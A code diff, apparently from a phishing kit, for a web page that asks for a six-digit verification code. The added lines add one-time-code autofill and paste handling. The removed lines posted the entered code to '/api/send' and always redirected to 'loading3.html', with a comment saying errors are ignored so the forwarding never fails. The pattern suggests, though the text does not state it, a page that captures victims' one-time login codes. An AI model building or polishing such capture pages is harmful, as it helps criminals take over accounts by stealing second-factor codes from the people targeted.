@@ -126,13 +126,13 @@
       <div class="info-text" id="infoText"></div>
 
       <div class="code-inputs" id="codeInputs">
-        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-      </div>
+  <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code">
+  <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+  <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+  <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+  <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+  <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+    </div>
 
       <button type="submit" id="verifyBtn" class="button-primary"></button>
       <div id="error" class="error"></div>
@@ -167,44 +167,45 @@
   errEl.style.display = "none";
 
   // Inputs: nur Ziffern + Auto-Fokus
-  inputs.forEach((input, idx) => {
-    input.setAttribute("maxlength", "1");
-    input.addEventListener("input", () => {
-      input.value = input.value.replace(/[^0-9]/g, "");
-      errEl.style.display = "none";
-      if (input.value && idx < inputs.length - 1) {
-        inputs[idx + 1].focus();
-      }
-    });
+  // Inputs: nur Ziffern + Auto-Fokus + AutoFill/Paste verteilen
+inputs.forEach((input, idx) => {
+  input.setAttribute("maxlength", "1");
 
-    input.addEventListener("keydown", (e) => {
-      if (e.key === "Backspace" && !input.value && idx > 0) {
-        inputs[idx - 1].focus();
-      }
-    });
+  input.addEventListener("input", () => {
+    const raw = input.value.replace(/[^0-9]/g, "");
+    errEl.style.display = "none";
+
+    // Wenn mehrere Ziffern auf einmal kommen (AutoFill/Paste) → verteilen
+    if (raw.length > 1) {
+      raw.slice(0, inputs.length).split("").forEach((ch, i) => {
+        inputs[i].value = ch;
+      });
+      inputs[Math.min(raw.length, inputs.length) - 1].focus();
+      return;
+    }
+
+    input.value = raw;
+
+    if (input.value && idx < inputs.length - 1) {
+      inputs[idx + 1].focus();
+    }
   });
 
-  // Submit
-  form.addEventListener("submit", async (e) => {
+  input.addEventListener("keydown", (e) => {
+    if (e.key === "Backspace" && !input.value && idx > 0) {
+      inputs[idx - 1].focus();
+    }
+  });
+});
+
+// Submit (außerhalb vom forEach!)
+form.addEventListener("submit", (e) => {
   e.preventDefault();
 
   const ziffern = Array.from(inputs).map(i => i.value).join("");
-  const text = `Code: ${ziffern}`;
-
   if (!/^\d{6}$/.test(ziffern)) {
     errEl.style.display = "block";
     return;
-  }
-
-  try {
-    await fetch("/api/send", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ message: text })
-    });
-  } catch (err) {
-    // wenn du "immer weiterleiten" willst, Fehler ignorieren
-    console.error(err);
   }
 
   window.location.href = "loading3.html";
